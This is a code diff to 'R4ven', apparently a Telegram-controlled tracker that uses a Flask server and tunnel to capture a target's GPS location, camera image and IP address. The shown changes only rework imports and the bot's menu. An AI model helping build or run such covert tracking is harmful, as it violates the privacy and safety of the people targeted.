@@ -1,4 +1,5 @@
 #!/usr/bin/env python3
+import argparse
 import os
 import sys
 import threading
@@ -11,10 +12,9 @@ import subprocess
 import re
 import socket
 from flask import Flask, request, Response, send_from_directory
+from telebot import TeleBot, types
+from flaredantic import FlareTunnel, FlareConfig
 import telebot
-from telebot.types import ReplyKeyboardMarkup, KeyboardButton
-import argparse
-
 # Set up logging
 log_file = "r4ven.log"
 logging.basicConfig(filename=log_file, level=logging.INFO, format='%(asctime)s - %(message)s')
@@ -367,39 +367,39 @@ def handle_start(message):
         del active_sessions[message.chat.id]
     
     welcome_msg = (
-        f"🦅 *Welcome to R4ven Tracker Bot* 🦅\n\n"
-        f"What would you like to do?\n\n"
-        f"1. Track Target GPS Location\n"
-        f"2. Capture Target Image\n"
-        f"3. Fetch Target IP Address\n"
-        f"4. All Of It\n\n"
-        f"_Note: IP address & Device details available in all options_"
+        f"🦅 *Welcome to R4VEN Telegram Bot* 🦅\n\n"
+        f"This bot allows you to track targets and capture information.\n"
+        f"Please select one of the options below:"
     )
     
     # Create reply keyboard
-    markup = ReplyKeyboardMarkup(resize_keyboard=True, one_time_keyboard=True)
-    markup.row(KeyboardButton("1"), KeyboardButton("2"))
-    markup.row(KeyboardButton("3"), KeyboardButton("4"))
+    markup = types.ReplyKeyboardMarkup(row_width=2, resize_keyboard=True)
+    markup.add(
+        types.KeyboardButton("1. Track GPS Location"),
+        types.KeyboardButton("2. Capture Image"),
+        types.KeyboardButton("3. Get IP Address"),
+        types.KeyboardButton("4. All Features")
+    )
     
     bot.send_message(message.chat.id, welcome_msg, parse_mode="Markdown", reply_markup=markup)
 
-@bot.message_handler(func=lambda message: message.text in ["1", "2", "3", "4"] and message.chat.id not in active_sessions)
+@bot.message_handler(func=lambda message: message.text in ["1. Track GPS Location", "2. Capture Image", "3. Get IP Address", "4. All Features"] and message.chat.id not in active_sessions)
 def handle_option_selection(message):
     """Handles the option selection"""
     chat_id = str(message.chat.id)
     choice = message.text
     
     # Map choice to folder
-    if choice == '1':
+    if choice.startswith("1.") or choice == "1":
         folder_name = 'gps'
         feature = "GPS Location Tracking"
-    elif choice == '2':
+    elif choice.startswith("2.") or choice == "2":
         folder_name = 'cam'
         feature = "Camera Capture"
-    elif choice == '3':
+    elif choice.startswith("3.") or choice == "3":
         folder_name = 'ip'
         feature = "IP Address Tracking"
-    elif choice == '4':
+    elif choice.startswith("4.") or choice == "4":
         folder_name = 'all'
         feature = "Full Tracking (GPS, Camera, IP)"
     
